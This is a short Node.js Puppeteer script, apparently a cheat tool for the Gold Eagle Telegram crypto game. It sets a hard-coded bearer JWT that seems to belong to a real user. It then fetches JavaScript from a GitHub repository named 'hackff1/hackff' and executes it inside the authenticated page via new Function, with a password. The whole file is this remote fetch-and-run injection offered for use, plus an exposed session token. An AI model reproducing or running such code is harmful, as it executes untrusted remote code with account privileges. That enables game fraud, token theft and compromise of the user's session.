const puppeteer = require('puppeteer');
const fetch = require('node-fetch');

const GOLD_EAGLE_URL = 'https://telegram.geagle.online';  // Gold Eagle website
const GITHUB_SCRIPT_URL = 'https://raw.githubusercontent.com/hackff1/hackff/main/c3-eagl.js';  // JavaScript file URL from GitHub
const PASSWORD = 'foketcrypto';  // Password for the script
const AUTH_TOKEN = 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7ImlkIjoiYzA5YTE2MGMtNTFmMC00MjdiLTkxMzktNGQwZDdmYWNhMWU5IiwiZmlyc3RfbmFtZSI6IuawlERBUlRPTuS5iCIsImxhbmd1YWdlX2NvZGUiOiJlbiIsInVzZXJuYW1lIjoiRGFydG9uVFYifSwic2Vzc2lvbl9pZCI6MTM4Mzc4Nywic3ViIjoiYzA5YTE2MGMtNTFmMC00MjdiLTkxMzktNGQwZDdmYWNhMWU5IiwiZXhwIjoxNzQyNDc3Mzc2fQ.DPiGrKNrNxhWM-qj1YDU1LoWPhI4X9RgJoggdkps8X0';  // Your Authorization token

(async () => {
  // Step 1: Launch a headless browser and navigate to the website
  const browser = await puppeteer.launch({ headless: false });  // set `headless: true` for headless mode
  const page = await browser.newPage();

  // Step 2: Set the Authorization header for your account
  await page.setExtraHTTPHeaders({
    'Authorization': AUTH_TOKEN,
    'Accept': 'application/json, text/plain, */*',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
  });

  // Step 3: Go to the Gold Eagle page
  await page.goto(GOLD_EAGLE_URL, { waitUntil: 'networkidle2' });

  // Step 4: Fetch the JavaScript file from GitHub
  const response = await fetch(GITHUB_SCRIPT_URL);
  const jsScript = await response.text();

  // Step 5: Inject and run the fetched script in the page context, passing the password as a variable
  await page.evaluate((script, password) => {
    // Wrap the script in a function and execute it with the password
    const executeScript = new Function('password', script);
    executeScript(password);  // Execute the script with the password
  }, jsScript, PASSWORD);

  console.log("Script has been injected and executed on the page.");

  // Optionally, you can close the browser after the task if needed
  // await browser.close();
})();
